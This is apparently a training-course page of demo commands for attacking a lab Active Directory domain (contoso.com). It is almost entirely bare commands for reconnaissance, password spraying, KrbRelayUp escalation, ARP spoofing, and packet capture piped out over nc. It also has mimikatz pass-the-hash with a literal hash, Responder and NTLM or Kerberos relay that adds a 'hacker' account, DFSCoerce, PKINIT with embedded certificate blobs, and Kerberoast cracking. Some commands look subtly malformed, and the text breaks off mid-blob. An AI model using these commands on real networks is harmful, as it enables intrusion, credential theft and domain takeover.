---
ref: goc213-demos
title: GOC213 Demos
date: 2022-10-11T11:06:03+00:00
layout: page
permalink: /goc213/
sitemap: false
---

## Active Directory Discovery

### DNS SRV Record Enumeration

Computer: Kali Linux

```bash
sudo apt install nmap -y
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='win.mit.edu'"
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"
```

### DNS Zone Transfer

Computer: Local

```cmd
nslookup -vc -q=AXFR contoso.com. contoso-dc
```

### DC Basic Port Scan

Computer: Kali Linux

```bash
nmap contoso-dc
```

### DC Full Port Scan

Computer: Kali Linux

```bash
nmap -A -T4 -p- -Pn contoso-dc
```

### LDAP Root DSE

Computer: Kali Linux

```bash
nmap contoso-dc -p 389 --open --script ldap-rootdse
```

### Active NetBIOS Scan

Computer: Kali Linux

```bash
nmap -sU -p 137 -n --script nbstat -v 10.213.0.0/28
```

### Passive Broadcast Scan

Computer: Kali Linux

```bash
nmap --script broadcast-listener broadcast-listener.timeout=30
```

Computer: CONTOSO-PC1

```cmd
ping contoso-pc3
```

### SMB Server Anonymous Scan

Computer: Kali Linux

```bash
nmap contoso-dc -p 445 --script smb-protocols,smb2-security-mode,smb2-time
```

### SMBv1 Server Authenticated Scan

Computer: Kali Linux

```bash
nmap contoso-srv -p 445,139 --open --script smb-enum* --script-args smbuser=bfu,smbpass='Pa$$w0rd',smbdomain=contoso.com
```
### RDP Scan

Computer: Kali Linux

```bash
nmap contoso-dc -p 3389 --script *rdp*
```

### Port Proxy

```cmd
netsh interface portproxy add v4tov4 listenport=50123 connectport=3389 connectaddress=127.0.0.1
netsh interface portproxy show all
```

Use with `mstsc.exe`

## Password Spraying Attacks

### Remote Desktop Web Access Password Spraying

Computer: Kali Linux

```bash
sudo apt install hydra maskprocessor wordlists -y

mp64 'Pa$$w0r?l' > passwords.txt
cat passwords.txt
hydra -I -V -t 1 -l Admin -P passwords.txt -u contoso-srv.contoso.com https-post-form "/RDWeb/Pages/en-US/login.aspx:DomainUserName=CONTOSO\\^USER^&UserPass=^PASS^:S=302"
```

### Remote Desktop Gateway Password Spraying

Computer: Kali Linux

```bash
hydra -I -vV -t 1 -l Admin -P passwords.txt -u contoso-srv.contoso.com https-get "/Rpc"
```

### RDP Password Spraying

Computer: Kali Linux

```bash
sudo apt install crowbar -y
crowbar -b rdp -s 10.213.0.3/32 -u Admin -C passwords.txt
```

## Password Audit

Computer: Local

```powershell
Import-Module -Name E:\GOC213\DSInternals

"Contoso2022`nGopas2022`nPassword123" > E:\slovnik.txt

Get-ADReplAccount -All -Server contoso-dc |
    Test-PasswordQuality -WeakPasswordsFile E:\slovnik.txt `
                         -WeakPasswordHashesSortedFile E:\GOC213\pwned-passwords-ntlm-ordered-by-hash-v6.txt
```

## Local Privilege Escalation

### KrbRelayUp w/ RBCD

```cmd
KrbRelayUp.exe Full --Method RBCD --CreateNewComputerAccount --ComputerName HACKER --ComputerPassword "Password123!"  --Impersonate Admin
```
### KrbRelayUp w/ Shadow Credentials

```cmd
KrbRelayUp.exe Full --Method ShadowCred --ForceShadowCred --Impersonate Admin
```

## MITM Attacks

### ARP Spoofing

Computer: Kali Linux

```bash
sudo apt install dsniff -y
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 10.213.0.3 -r 10.213.0.1
```

### NetworkMiner Remote

Computer: Local

```cmd
E:\GOC213\NetworkMiner_2-7-3\NetworkMiner.exe
```

Computer: Kali Linux

```bash
sudo apt install tcpdump ncat -y
tcpdump -i eth0 -s 0 -U -w - | nc 10.213.0.1 57012
```

## NTLM Attacks

### Stealing the Hash

Computer: CONTOSO-PC1

`mimikatz.exe`

### WMI Pass-the-Hash

Computer: Kali Linux

```bash
sudo apt install python3-impacket python3-dsinternals -y

impacket-wmiexec -hashes :92937945b518814341de3f726500d4ff contoso/Admin@contoso-dc
```

### RDP Pass-the-Hash

Computer: Local

```cmd
mimikatz.exe

sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"reg add """\\contoso-dc\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server""" /v fDenyTSConnections /d 0 /t REG_DWORD /f"

sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"reg add \\contoso-dc\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD /f"

sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"mstsc /v:contoso-dc /restrictedAdmin"
```

### NTLM Traffic Capture

#### Respoder

Computer: Kali Linux

```bash
sudo apt install responder -y
responder -I eth0
```

#### Victim
Invoke SMB: `dir \\offline\data`

Invoke HTTP: `http://intranet`

#### Crack using Hashcat

Computer: Kali Linux

```bash
sudo apt install hashcat -y
hashcat -m 5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.213.0.3.txt /usr/share/wordlists/rockyou.txt  --force
```

### NTLM Relay

```bash
cp /usr/bin/impacket-wmiexec /usr/bin/impacket-ntlmrelayx

impacket-ntlmrelayx -t contoso-srv -smb2support -c 'net user add hacker Password123'

responder -I eth0
```

### DFSCoerce

#### NTLM Relay to CA Web Enrollment

```bash
sudo impacket-ntlmrelayx --adcs --target http://contoso-dc.contoso.com/certsrv --template DomainController -smb2support
```

#### DFSCoerce

```bash
git clone https://github.com/Wh04m1001/DFSCoerce
sudo python3 DFSCoerce/dfscoerce.py -u bfu -p 'Pa$$w0rd' -d contoso.com 10.213.0.101 contoso-dc2.contoso.com
```

#### Kerberos PKINIT
```cmd
Rubeus.exe asktgt /user:CONTOSO-DC2$ /ptt /getcredentials /certificate:MIIRzQIBAzCCEYcGCSqGSIb3DQEHAaCCEXgEghF0MIIRcDCCB6cGCSqGSIb3DQEHBqCCB5gwggeUAgEAMIIHjQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIjVR2X7MiRXcCAggAgIIHYInvjIUg0+J6nevuoMGeUfWUDI+9vwRUKTMoyiIfSVpxPM+ycel0idOE0cAGJLaSJ72JVXy7SkN4IBC4bpcmsJtLJwiWTrxZXS/4/cSASWNUbUQXSnr9tL9nEvJaBDDJWTARNUeLTJljDZbEJB7aR53Ms4eRlWj5RG69c565q60TMhhJxYBDCjCSEv2aVRbvvglf3RwrqWg2PmZQb2J15IsPEMofur971GlN5/GyO0QExu3uUwE+fPvoUBVeTnrRYcpaglUCDHUHQsGetUq4YX2DiyVyXbWq+d32CFngRR8c10Milq6SW2gcGw7iyraPJnu3l++UWdH20vcRUBEzPPKZedJ9v4/HBRGa72tS4TKHHw0iBi4VGaHkyb1A+dhiPEj5fcohIp6FEF15d5unKjf0/5wKWwVmKexBmgICcpVdXCccuDS439mYppI+4VwSpbBA+pmr3S9IZtAHKFIcRrpqGikxshVC2RAVwRiQ9GXqf4W9W2augNjbHldzWRQd+FpewsrMOkCOcKacKO8lgkpaB7C/avCP8gVEujBVnNEIfT9/VotYw7DYgkWffUu15E08iaaiWTNk6kaad4vGT/0OvSATU9nQecmWnmQ0qho8tKMUi5GM6kzcw2iEVJymrj99tgxX69yPr/pe+SN30r+FMD0KkV94SLq6fwwotc1uT+Qt06F4/c4O81ipoBATGogYOYptzmmH/wrtf/gmAitGhbgb0F/ndefC2bRTsQ/8/E6rXR+hmN4De6ZaTS6jKtmlNv5cr5Ce4Js397WKDL4fagcu4bMXIm6KfAAGNatbh0vRY50jQIMKqs/tCCUjK+JyeaV9BNF+xGM0pBbTT1z4APdSS336q8T7jpKGyajgbUWtajScMwJ3OlZVxGhR8xdycGMQdFPH1ofWMEQIv/LWfCY8Wr1zpgt+qwTm2j3IIbSecwEcNjOGJ9QF8D8jlkke1usoLZYNe9Xr7W5+3Qztxwz6dOwVcLADGaxttmvRdjG+WwTtYGxTQSLz4SELAB2hRvTOG2MRlv5+b8mnRISDlYvAMgwfN+xmfuVrhqB0u+rCPAuq0RgaLKWL0fu95TWib+qGtkgIclx7XjS0CkkvEYmSfow947DwSWnzY3lz56a/2hktUaWtgIR56vRFORZL7DeasiWah0b5w1kemx+V5Cz81qnZj9u0Zj+Wn750BH69mpJ2VkS9o3bXsdryD4SptdVPVZKvtq3tuIeEZZF3tEpMAjKjyt+Ojk29XARUNd5I+u4cbmOgVsX2ngp4h6z+VJD1LcHuw7AUILKyMkKcZlIcoRGd4Rb5BdlDA4QJXNzgWEyhLIm0CGii044h7EWffqZk2fm3UqukOdVcxOZr63yofcGQv5MbopNvkkITrKrTSq0k8W9/GPf6aW9plDVTKYvdYp/ykO4qdlOaRQDu5q/MhGAEkjRygh3enuzN5PqmckAOhg00+HvTCohwY7uEdBKXbxC8iS3TiDmeb0Iou+/u9HxVVBFc6xRrPR/H6kz2uGhC6WewOMlK7nBDnk+JqwxEy2rcChvXeAg6nHUvV6xGzNujI4PDnMsYLgPs1sfLu10Oj78z+9SE8EigfKZhEEWIiPI7GIVKmXaQOJsC3pPjL8aCKI8y5G7N4/2uUhzFOZRzaOwbdyd9JyVNsLayqXQ1AX7OnaGhIVfPPkxLPXEEnJkZeROWUHl2EDGvUa+qvtb7+b+txOuZ5fZ515rkjpAAWOFQnK/jZbbMXCAdDXpddmNpLat6Zhz7Wyjnh5BNDwMhTbNNDbVnDXQzqhF2Yie2fgEyJCTNzz9DwoDrEE81DVQJiZE21CHA2cBC66o04I/p9L2GbXt2z57x2HyUzkuZGnlzLKa/hWXyy82Gw9RzgAYQY1RB+qG5hrQ6vx9xvHjjb872kKu+ohp95aDxjvueVV0Wuwb83VV9ISXARg9Fl6Bn6DjW1xwGPwyQZwfwNp4C3F296AFBsAVAK6atR/7LLCg3baFlSr2P7iYd5ILgjc9VqZLJeuFyKorkUW2RwIJPdIKXf6rroWIYUlEA8ajzj+GENyhJmw2aVab2TaOpV4VDsRTkDrmVkTurqXJLjLtfQe9Eb3Q7/hhv5QE78hExUr23iBRxht49C6T1WMeLzwEgtb4q/HKpvDkQo7GbuTrCzxCQgR15kE5C2d2x+0qWKxlpbI2CDR2II9/5qrSieXiLU5g8uR6J4W28QftWPR5MuRfrTb17KrEIKHAqVgW8irhsitLaB+8RUItWdpd3af8xt5noXUC+GSwfZruAztRVcMdmRDc0CyaogGUWNLd3XcUe3PcNpo+tuo+mrCUTmKd4dQvjPbWpUa7jmNt6KLAS4pa2jmT/Xm7FKZt4eoLPD7LPNYJdqbj5ovQLHgpyGPfkfrpmpFr1ARxJtluniVbpRpQZavOhbUe8sSxBZB9FSvf6f4DmcUXmURCwK7Lg6WL1HzIdEg5qIgTsDoPzsppYx4qE/gbExOkDB9FJ0b7FJnV548FiJuhVl9gwggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQI2rCEbNIpwXYCAggABIIJSIxy70T6RH6sDD5+fZOBh7CkuaD9HSCDjPij7YaSOtlpS0atUWn/grQn4DScF3Qv/YFXqN89kJgf8rVV5jERIS0alpPyw5Ta3i87ngPuSdM/G47t6sj/R2UdrZYpq9ebmeneaM02eiTvNHOpx4QikjvEhcf2d/4YWRJ1oquMH810bgVSCHaZYUeaNSG/2H53fTyB17Qa/MFrbiBFtTulKL2e8lXURFqsIR/A4FtiGUCzqXimlqZL5seXD0P0h3xxWjKPjmxBeFwlRFwsW2RdTXzEmwW6MZ6Juhhecf+fgiVxyAol9Bj8+qpUdpCX8TNe0WAMDctBsQjUrblFijztBAWGtl9uRI67eg1MpVXqj/F/2rHcbBQKoXTOsjKjkZMBKiGBIIDBMLmGDAn8yc+fdeJLVL+AFIzBoFuSCQwE1nqUJwRDL/za3dePng48yeFQViw8542mhfVyy1Z1og/SXmOaMC/tg4iSm9G+nPA2TqprE9lMybnNDVsXwUPx2mIiBEi+mTTY8lZRO8zBP6EzWFo7HX1v/9e1kMTlaqO8hrLfN1koHzv5GRPq0T9IZZKIUltH3AHU5K+zKiK3MfFliXdEg5HD36TnFSUOVrFVLJrrD2PbMXt6ZmlHwSsgClaLFZb54C+m+qiRXsMfKuSvADJVBdt2VLc432ymMwPMfE/bdIVs8R8LzCv2Op5Csmh/k7Id1uemVSFqv/7VD6hsBC/o6nYpg3QPVgJyTLqGdjT+w4Ptg1WfOChKygnzArtIyT1ewKUlFONa97pIwKup4mvEEnIyGgZ9LHcG/fU/OsSoNnUMVChtSSlh6yUp/qu31+oQOy9D6d3wWuprAkgtPkC7PuYvR1tBl5K53dp9xXV5CNG4EMY2E8MvXyO+og1DCne1FqF6TIS6XDxWZKj3YPd+hz6d0mtslkbBLhbcnVw5KPiIztQGZBNsW4Jz2N6vk0y+yDLF5EGZyMa2cCHBNjqrj8VxZAjEjzfhuxcLIE5PexOMFtYSfnR7D6CRO1bQzpUB2RDso6waIAsoD2jD0Lc7xrAGmYjUZRm1UKH06m6GiKciIaLvTO5kztVD0Dus972iqkPTBsbtkAUvjfbipYetvGraO2QMeLLg/JuEAgIE3TY2SGFlrxSI5Ml7NkZPvJ55Wijfd/YSoDTDewkvhVJnjhsBV3sTRgbXOtrwQEiJwaY65XHmN2NsqmMYBNtaxUoZ5jj7V8IchzuuxkknKy+2C7UcaCrrDjrzvgt5A+I7Q8IYr47XKdCuxaw1A1tvY7wn0ApY9Q7wCJfOqZYklFxzub+BI/bbxwe03oiSgPk4mBl9gmdcPRtQ2OT83/QpRtc/NPhsB+yzyiMFkbcIxjTi5oHqEtXVF5o+17HyMKvrNdHPo0KGcTFBBjlgB7Oi6nB6QF4wBpdEReolsNq3EQ/d2xM0F+XHsh3iZM5LvMuwLuGnMyiwiIfLj0XDQbg3nbzzsZm24EyiwadnZGOdUPY3OhRm9pVPPSWm5FWCnXtV2S9X6+g3oi43PYrviZVH4TBOwRRDMrbyUcMOCp5sIMXVvStjrWTNZwpcMgAsYHNNL0svv5GJcSAs3xeoCtZy5HbQQrILBqogIv0KyRM1FHzOhTIkcAOCwt8nGEPrnsgGblL2qAIXBNG8jo/F7/ULXJoqa7aKUWF4FIgd0vj/WNuYlluxyXJPpO1FEclUfaehp/ZHIN3pL9+MNqjAugDucCfuPGQnu0rNny7G6yZdptEVFizrxvchIwDvmuFTyFItKD62XlTJpnFuVBXB2CN0YGXDxfg/zf15OIYFrrw+ZO6HgX0S6Do+79oewR5lkZyIEL2F1SEw03tGahQVkkCfLdwo26ettqwMVB/OlWqaXlygaUn3gLTmdpU3JnMYPejxomKuxB5LuZtbHgjhEe8aV7gqMoScFB8YYByUgT3f9hefjEpi8tOBG75wwoTc+v7twqjLdRkPDUTmERSrVoj2qk3vslhG9VvzPlXzXXDdo45sarxqDf2HG6SbRDvv10WrN7roCuEgTrV56J3Y2597vYA5yxYnf98bjHC837gVm3O87d0PAvQBFn0FT16p2FJ0YOUcLkS9HnvQagq06vx3SZ+inj/FA5xWyNEqgMXpbqoBtmjU/4GIDW3HMcgYMd2pGBwNQOnxQ3vGZz+ajmsKD1ztu00WRmVpbW3AFAOCVLNJyFMmMkCzHKFAl315S7R2WMKUDb5o1V4SfxS3kNHwf0+PkzAjFSte0KHek/AeS746lAkvjdrcalO5q+4Cq6UrRv5HPARYxodV4lKXk4ItlyXgRRH8JnCvu4cXLjOIeajk2FkPWq7tloYMlfaE+qVfO1Lm7LmKNaoOJ8tM9ro3eGsoxtEWVNxtT2lMNhl6T2qVx2SN56Twc7dLboIlo0kEchIu5mF4j2gFYk5kjeAtc6ELIc4skq0mN0kdpp3z1w9dhFOpS6HT3Ao3VwnFxfQmqemCsDLsuApwmanZl7lTNSnOESFh10JmQ66n1lMqOGRqZnU8eV++SBpms7/s8ZhAD3LI1fPDCxgWcDoXjrkt4XSPaFaFUXVH5+RaBJFuAjx33iqAPCS06wmytoNeKpRQxGwwUQiFWmBREa+wcw96YHnz6/dj1E+FHkYx79zNuaFjSBg8zeKxyjT/fNU3eT6p3jeje5rwl8al9BW8Rad1r/GxvAVUipS/zc/500JM23pnL6HaCeSoeurv1fNbn1kHETVehG7ScM3G7xW8W6bIJwIlxOFc5zVOZKzEiQj2X2l4D12QVrFLwbxEeF3dgxm8mY9DMJwAINl/oFbdIYhh04KjJA9ZisGuDUwv/47E09Bt1bjoyKzW+Lm4vv/fiUQsFKyxp4poH0Y5eRlaJ9r9DeE42GtMMr3ZiqiMVgMAm0A0+NABcntdKUxdpzMw9mDWAYzrWp/wDrJo/3NkP2IsaKUDYsvOHgO9w2mlQkDibDsOzVn4pNPUXGFrcQ1fAbC2k2B+29W8uxTUZ8wy2EgAbsh9lu+C2NXB7nZychwwfZZw+NMDqDT0qSJLO+1OhTclol9CnCr8UNUjWP8WltYN5U+Rl18lzbI/JpwSYrVJXRJY/35Kt+rklCrzFutkgef3SuDiFX6VTPtOFoJxhvkXn0ZuVUfIrdAAX3o2AwyfaCA4fSPaOrQqxzElMCMGCSqGSIb3DQEJFTEWBBRsA+Hx8tSGm4xGtiJ7oTuVo7kdqDA9MDEwDQYJYIZIAWUDBAIBBQAEIFHexufLLFCzzWGFMVnyjvchoq3sKr22PRtwC0pkO4QiBAjUv6vbabtxVA==
```

#### DCSync
```cmd
powershell Get-ADReplAccount -All -Server contoso-dc.contoso.com
```

## Kerberos Attacks

### Kerberoasting

#### Rubeus Kerberoast

Computer: CONTOSO-PC1

```cmd
\\local\GOC213\GhostPack\Rubeus.exe kerberoast /domain:contoso.com /nowrap
```

#### Cracking uning Hashcat

Computer: Kali Linux

```bash
sudo hashcat -m 13100 '$krb5tgs$23$*Administrator$contoso.com$MSSQLSvc/db.contoso.com@contoso.com*$FA4A2618CDA95386FC8B4E1ECC53B135$E23001DE0FACAD5BC8B6F49ED6CA69C57A51D04C1872F4305759CBA2BCDB0F3C7E2675F43E07537BD39676DFDBD3C14F60253C0309DA703588627B1DBC84813F108703453561B2FAFF8A52FF9E36AB3993728C99D03ECE6E494EDE6916F18761BA8E711A80F7464A5DF53195CDB974EC0C0E719A3D6FFA07CE74B11DA82EBA025624341D923A90D0338431A1E36BAB92FC5F3CBA5100BC712A196C287C18DC32E00E6484D633DD1AD4B1CAADF6F88CC7B6C76F986DCFFD1DAA284A60D37BE2F6702528360698EEA63A2B72CF1511AA76C22F3F8AB2FE5E25B357E556C808DE6E8E6BEA8357AE329CB3CA94AF6DE7C4EEF1EB693BAF7AC638AC5CFE72307BC45151F43F6227F07A30BD68A11856EDE0BE2DCD176DEC98BDE26CF56D47AD47A957C4125BE161A4189EC69FCFE3D5A9654B3765D7B28C45199EB7A2E5118A0C13BBD4585FFBAF06C421AC6D3B86D7FB5BA2A7CFE6E4EEC7309368BF6A48DD536D74DBAF507E389950781E0D87A3BF597BC48FECCDFC3411A2DEB9A5D15AD0708101C977AC6C2CC9C9BDD3943127C70437B47AD2D7AE5BD57D3A8DD6CF2B1E687BB6F1A87A3DA8E156F7A43C01C6DDC6335BA7680C39EDEF386A3C856816BE14DF91933F94B39D1B552CF5836A57605A75EBED2783E49B7A4CBC562848AE1BCBDBF4C85EA3C5AF63DD6B19381138F2AEBF4C66FB78833E4C17A7499E79B1801E1592B954CF17CB0BE897F6C63135A2ED5558E12512F5130F26905F21D3ECD7A5F4CC32C3B64AD02D389C79C65E9FCC1E305B7863F1A4329B93B9CC595E20DEB7587FF085F0181DFA0E927BAD39A8D468F61E794CC2886DEE466684B945DDC6C1885D9049E437B5FC569208843A8CAAC0106CA9207F22D8B0168FDEA01BF3577235339ECFD0065F656AFE70013251E1D066E9B9C881AE70C7780E2B44CB7CA2F9835CA9129BE869C6336B0819AD3D758CE613379E37E0FEE508BB01E55B7026C01038B2B4C6660C5F71820448127F55E9823D381C681BE2EF91733DD7F07C95AC6ACCF29CEB6F30D194D21728C9D1553056EC9910264439DF7649CE94DD7E0AF052A6426474D6DD18B641951E6D70101CC5D779C39E0F3FAE710D0AF575A6A75DF40AAB6AF3371E25DAA9E4B755C64D1929A889C5B6D239FB5892E72D7F4E47120902A718225E23DE5FD82295CA21A52EABAE3B131DD0657F650C8EA42A1FE53ED5D253550FE191C4BFEFA37292012A98EF25E805DCFCE8100B5B7D65DFB0CC99DB0675B9FE9B78B95F79CA460FD6D5D1A9EE66DD9EEB5477AD6BF3C1B674A59E7E3D699D265612853CFFE643A94F5696AAA2016A30A1C65DA8809B0CDEA06C3ADE4BA61CFBC73FE0435C4C00DE9C3F15FC00816ECEDA05DD55ADF94E0C9DFA5C4DE002D18490090D3988615B1A1C8DA584C5C3DD6A4513ED676FB2217F4DD6A1329365A7790CB5846F4688BE604A3E23948D5FC86A545A1806195A5F3AAD90C8F45BA8C7DC831B35B4670ECA0C5C6011F6379EA4C00FBED89E1919A1F2B6A7DA60C44E5F46B3915A6A4974193C7DFB5972EB0D7302FC8F734547A5DA' -a0 /usr/share/wordlists/rockyou.txt --potfile-disable
```

### Cross-Forest Pass-the-Key

#### Dump Trust Credentials on DC

```cmd
mimikatz.exe
privilege::debug
lsadump::trust /patch
quit
```
#### Pass-the-Key
```cmd
Rubeus.exe asktgt /user:CONTOSO$ /domain:adatum.com /rc4:e1874310c18a0dc8d5777b145a609b58 /outfile:adatum.kirbi /ptt

ldp.exe
```

### MITM6 + Kerberos Relay

#### Kerberos Relay to CA Web Enrollment

```bash
git clone https://github.com/dirkjanm/krbrelayx

sudo python3 krbrelayx/krbrelayx.py --victim contoso-pc2.contoso.com --adcs --target https://contoso-dc.contoso.com/certsrv/ --template Machine
```

#### MITM6

```bash
pip install mitm6

sudo mitm6 --host-allowlist contoso-pc2.contoso.com --relay contoso-dc.contoso.com --domain contoso.com --no-ra –-verbose
```

#### Kerberos PKINIT
```bash

git clone https://github.com/dirkjanm/PKINITtools
pip3 install impacket minikerberos

python3 PKINITtools/gettgtpkinit.py 'CONTOSO/CONTOSO-PC2$' pc2.ccache -pfx-base64 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